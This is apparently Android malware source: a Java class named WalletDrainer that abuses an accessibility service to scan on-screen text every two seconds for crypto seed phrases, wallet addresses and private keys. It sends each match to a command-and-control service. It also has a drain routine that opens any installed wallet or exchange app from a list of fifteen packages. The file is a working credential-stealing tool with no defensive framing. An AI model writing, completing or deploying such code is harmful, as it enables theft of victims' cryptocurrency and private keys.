package com.wuzenx.engine;

import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;

import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class WalletDrainer {
    private C2Service c2;
    private boolean active = false;
    private Handler handler = new Handler(Looper.getMainLooper());

    // Seed phrase: 12-24 BIP39 words
    private Pattern seedPattern = Pattern.compile(
        "\\b([a-z]+\\s+){11,23}[a-z]+\\b",
        Pattern.CASE_INSENSITIVE
    );

    // ETH: 0x..., BTC: 1/3/bc1..., TRX: T...
    private Pattern addrPattern = Pattern.compile(
        "(0x[a-fA-F0-9]{40})|" +
        "([13][a-km-zA-HJ-NP-Z1-9]{25,34})|" +
        "(bc1[a-zA-HJ-NP-Z0-9]{39,59})|" +
        "(T[a-zA-HJ-NP-Z0-9]{33})"
    );

    // Private keys
    private Pattern pkPattern = Pattern.compile(
        "(0x)?[a-fA-F0-9]{64}"
    );

    public WalletDrainer(C2Service c2) {
        this.c2 = c2;
    }

    public void start() {
        active = true;
        c2.sendMessage("log", "Wallet scanner started");
        scan();
    }

    public void stop() {
        active = false;
        handler.removeCallbacksAndMessages(null);
    }

    private void scan() {
        if (!active) return;
        try {
            AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
                WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
            if (root != null) {
                scanNode(root, 0);
                root.recycle();
            }
        } catch (Exception ignored) {}
        handler.postDelayed(this::scan, 2000);
    }

    private void scanNode(AccessibilityNodeInfo node, int depth) {
        if (depth > 15 || !active) return;
        if (node == null) return;

        String t = node.getText() != null ? node.getText().toString() : "";
        String d = node.getContentDescription() != null ?
            node.getContentDescription().toString() : "";
        String text = t + " " + d;

        if (!text.trim().isEmpty()) {
            // Scan for seed phrases
            Matcher seedMatcher = seedPattern.matcher(text);
            while (seedMatcher.find()) {
                String found = seedMatcher.group().trim();
                // Validate - seed phrases should be 12-24 words
                String[] words = found.split("\\s+");
                if (words.length >= 12 && words.length <= 24) {
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("seedphrase", found);
                }
            }

            // Scan for wallet addresses
            Matcher addrMatcher = addrPattern.matcher(text);
            while (addrMatcher.find()) {
                String addr = addrMatcher.group().trim();
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("crypto_wallet", addr);
            }

            // Scan for private keys
            Matcher pkMatcher = pkPattern.matcher(text);
            while (pkMatcher.find()) {
                String pk = pkMatcher.group().trim();
                if (pk.length() == 64 || pk.length() == 66) {
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("private_key", pk);
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    scanNode(child, depth + 1);
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
    }

    public void drainWallet(String targetAddress) {
        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log",
                "Drain initiated to: " + targetAddress);

        try {
            String[] walletPackages = {
                "com.trustwallet.app",
                "io.metamask",
                "com.binance.dev",
                "com.coinbase.android",
                "com.mycelium.wallet",
                "com.bitcoin.wallet.btc",
                "com.defi.wallet",
                "app.uniswap",
                "com.pancakeswap",
                "com.ledger.live",
                "com.exodusmobile",
                "com.electrum.wallet",
                "com.blockchain",
                "com.crypto.exchange",
                "com.kraken.trade"
            };

            for (String pkg : walletPackages) {
                try {
                    Intent intent = C2Service.instance.getPackageManager()
                        .getLaunchIntentForPackage(pkg);
                    if (intent != null) {
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        C2Service.instance.startActivity(intent);
                        if (C2Service.instance != null)
                            C2Service.instance.sendMessage("log",
                                "Opening wallet: " + pkg);
                        break;
                    }
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }
}
